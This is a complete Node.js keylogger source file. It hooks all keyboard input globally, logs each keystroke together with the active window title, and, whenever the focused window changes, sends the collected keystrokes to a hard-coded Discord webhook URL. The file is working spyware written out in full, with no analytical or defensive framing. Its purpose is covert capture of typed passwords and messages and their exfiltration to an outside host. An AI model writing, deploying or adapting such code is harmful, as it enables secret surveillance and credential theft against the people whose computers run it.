const { GlobalKeyboardListener } = require("node-global-key-listener");
const axios = require("axios");
const activeWin = require("active-win");

const keyboardListener = new GlobalKeyboardListener();

let lShiftDown = false;
let lAltDown = false;
let rShiftDown = false;
let rAltDown = false;
let keyLogs = "";
let lastActiveWindow;

function convertToUppercase(letter) {
  return (lShiftDown || rShiftDown) ? letter.toUpperCase() : letter;
}

function processKey(key, state) {
  const keyMappings = {
    "tab": "<TAB>",
    "return": "<ENTER>",
    "space": " ",
    "escape": "<ESC>",
    "delete": "<DEL>",
    "backspace": "<B.SPACE>",
    "left shift": "</L.SHIFT>",
    "left alt": "</L.ALT>",
    "right shift": "</R.SHIFT>",
    "right alt": "</R.ALT>",
    "dot": (lShiftDown || rShiftDown) ? ">" : ".",
    "semicolon": (lShiftDown || rShiftDown) ? ":" : ";",
    "minus": (lShiftDown || rShiftDown) ? "_" : "-",
    "equals": (lShiftDown || rShiftDown) ? "+" : "=",
    "home": "<HOME>",
    "ins": "<INSERT>",
    "print screen": "<P.SCREEN>",
    "section": (lShiftDown || rShiftDown) ? "~" : "`",
    "square bracket open": (lShiftDown || rShiftDown) ? "{" : "[",
    "square bracket close": (lShiftDown || rShiftDown) ? "}" : "]",
    "backslash": (lShiftDown || rShiftDown) ? "|" : "\\",
    "page up": "<PG.UP>",
    "caps lock": "<CAPSLOCK>",
    "quote": (lShiftDown || rShiftDown) ? "\"" : "'",
    "page down": "<PG.DOWN>",
    "comma": (lShiftDown || rShiftDown) ? "<" : ",",
    "forward slash": (lShiftDown || rShiftDown) ? "?" : "/",
    "end": "<END>",
    "left ctrl": "<LEFT.CTRL>",
    "left meta": "<LEFT.META>",
    "right ctrl": "<RIGHT.CTRL>",
    "left arrow": "<LEFT.ARROW>",
    "right arrow": "<RIGHT.ARROW>",
    "up arrow": "<UP.ARROW>",
    "down arrow": "<DOWN.ARROW>",
  };

  if (state === "UP") {
    if (key in keyMappings) {
      process.stdout.write(keyMappings[key]);
      keyLogs += keyMappings[key];
    } else {
      process.stdout.write(convertToUppercase(key));
      keyLogs += convertToUppercase(key);
    }
  } else if (state === "DOWN") {
    if (key === "left shift") {
      if (!lShiftDown) {
        lShiftDown = true;
        process.stdout.write("<L.SHIFT>");
        keyLogs += "";
      }
    } else if (key === "left alt") {
      if (!lAltDown) {
        lAltDown = true;
        process.stdout.write("<L.ALT>");
        keyLogs += "<L.ALT>";
      }
    } else if (key === "right shift") {
      if (!rShiftDown) {
        rShiftDown = true;
        process.stdout.write("<R.SHIFT>");
        keyLogs += "";
      }
    } else if (key === "right alt") {
      if (!rAltDown) {
        rAltDown = true;
        process.stdout.write("<R.ALT>");
        keyLogs += "<R.ALT>";
      }
    }
  }
}

keyboardListener.addListener((event, down) => {
  processKey(event.name.toLowerCase(), event.state);
});

async function checkWindowChange() {
  try {
    const windowInfo = await activeWin();
    const { title } = windowInfo;

    if (lastActiveWindow && lastActiveWindow.title !== title) {
      sendToDiscord(title, lastActiveWindow.title);
    }

    lastActiveWindow = { title };
  } catch (error) {
    console.error("Error getting active window:", error.message);
  }
}

async function sendToDiscord(currentTitle, previousTitle) {
  try {
    if (keyLogs.trim() !== "") {
      const content = `\`\`\`[Current Window: ${previousTitle}] \nKeylog: ${keyLogs}\`\`\``;

      await axios.post(
        "https://discord.com/api/webhooks/1232964574844813353/N3B1IiWcnAJegbs0zDkEIlCCrtDJAEgZATdEeXBe7OsPVzp9k56PMj1DAvwYMLudWrB9",
        { content }
      );
      keyLogs = "";
    }
  } catch (error) {
    console.error("Error sending to Discord:", error.message);
  }
}

setInterval(checkWindowChange, 1000);
